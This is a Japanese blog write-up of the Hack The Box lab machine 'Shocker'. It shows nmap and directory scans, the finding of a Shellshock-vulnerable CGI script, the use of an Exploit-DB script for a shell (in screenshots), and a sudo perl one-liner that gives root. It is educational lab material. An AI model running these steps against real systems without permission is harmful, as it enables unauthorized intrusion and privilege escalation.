# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。
主に記録用として記しています。
現在のランクはHackerです。
間違っていることも多いかと思いますが、よろしくお願いします。  
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
チートシートも公開しておりますが知識がまだまだ不足しているため、学習経過とともに身につけた内容などを随時更新していきます。
GitHub(ペネトレーションテスト用チートシート):
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet
Twitter:@yukitsukai1731

# Shocker
![コメント 2020-07-31 172043.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/6ceeeb44-e874-f0f4-e05d-2703ce1f11f2.png)

HackTheBox公式より
Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.

Shockerは全体的にはかなり単純ですが、何百万台もの公開サーバに影響を与えた有名なShellshockの悪用の深刻さを示しています。

# スキャン
Shocker(10.10.10.56)に対して、スキャンを行います。  
まずnmapからスキャンを開始します。
## nmap 

```
nmap -sC -sV -oN shocker.nmap 10.10.10.56
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力

```
# Nmap 7.80 scan initiated Thu Jul 30 23:54:31 2020 as: nmap -sC -sV -oN shocker.nmap 10.10.10.56
Nmap scan report for 10.10.10.56                                                                     
Host is up (0.25s latency).                                                                                 
Not shown: 998 closed ports                                                                                 
PORT     STATE SERVICE VERSION                                                                                        
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                 
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                 
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 30 23:55:11 2020 -- 1 IP address (1 host up) scanned in 40.57 seconds
```

この結果から，80番ポートにおいてhttpdが動いていることが分かります。
![コメント 2020-07-31 153322.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/f7470dd2-9865-5063-92da-be5d702ff3c6.png)
特に他に得られる情報がないので、gobusterを使ってディレクトリをスキャンします。

## gobuster
```
kali@kali:~/htb/Sense$ gobuster dir -t 25 -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o shocker.gobuster -k
```

```
kali@kali:~/htb/Shocker$ gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o shocker.gobuster
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/29 00:52:05 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2020/07/29 02:23:06 Finished
===============================================================
```
特に得られそうな情報がありませんでした。  
拡張子の指定などgobusterの設定を変えてみたのですが、見つからなかったので使用するスキャナーを変更してみます。

## dirb
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: shocker.dirb
START_TIME: Fri Jul 31 00:32:29 2020
URL_BASE: http://10.10.10.56/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.56/ ----
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)
+ http://10.10.10.56/index.html (CODE:200|SIZE:137)
+ http://10.10.10.56/server-status (CODE:403|SIZE:299)

-----------------
END_TIME: Fri Jul 31 00:51:38 2020
DOWNLOADED: 4612 - FOUND: 3
```
/cig-bin/のディレクトリにはアクセスできなかったので配下に何かファイルがないかもう一度gobusterを使って調査します。  
cgi-binではwebサーバで動作するスクリプトファイルが格納されており、主にsh,cgi,plファイルが使われているようなので拡張子を指定してスキャンを行います。

## gobuster(2回目)
```
kali@kali:~$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.56/cgi-bin/ -x sh,cgi,pl -o shocker.gobustercgibin
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56/cgi-bin/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     sh,cgi,pl
[+] Timeout:        10s
===============================================================
2020/07/29 01:51:34 Starting gobuster
===============================================================
/user.sh (Status: 200)
===============================================================
2020/07/29 03:23:06 Finished
===============================================================
```

![コメント 2020-07-31 152742.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/85e92d16-3d9b-7b1b-2cc2-71549b5f5bf1.png)
![コメント 2020-07-31 152921.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c0c044a7-6620-4114-4e25-67b96a8ae7f1.png)

user.shを発見することができました。

# 侵入
マシンの名前と.shファイルからshellshockに脆弱ではないか疑います。
shellshockに対して脆弱であるか調べてみます。
以下のURLを参考に調べてみます。
<img width="1273" alt="スクリーンショット 2020-07-31 17.59.56.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/ea37c5fa-ed26-bb04-5dd9-8a5591c9f6dd.png">
これにより、echoコマンドが実行されてaaaaという文字列が表示されているので、shellshockに対して脆弱であることが分かりました。

## Shellshock
searchsploitを使ってshellshockに使えそうなエクスプロイトを探します。
![コメント 2020-07-31 153020.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/58d9b268-908a-1873-6fc9-fe2639f864f4.png)

linux/remote/34900.pyを落とします。

```
searshsploit -m linux/remote/34900.py
```

コードを見てみると、rhost,lhost,lport,pagesを設定する必要がありそうです。
それぞれを指定して、実行します。
![コメント 2020-07-31 155657.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/4ee25ee5-614b-b49c-eb78-20e90fb5c032.png)

![コメント 2020-07-31 160030.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/0b289973-98bc-1532-b0dc-6bdfc006075b.png)
シェルをゲットすることができました。  
またsudo -lの結果よりperlを使えばパスワードなしでroot権限を取得できそうです。

# 特権エスカレーション

```
sudo perl -e 'exec("/bin/bash")'
```

![コメント 2020-07-31 171604.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1b212abf-d1fd-89d2-b9c6-f4490cce5125.png)
root権限を取得しました。  
お疲れさまでした。
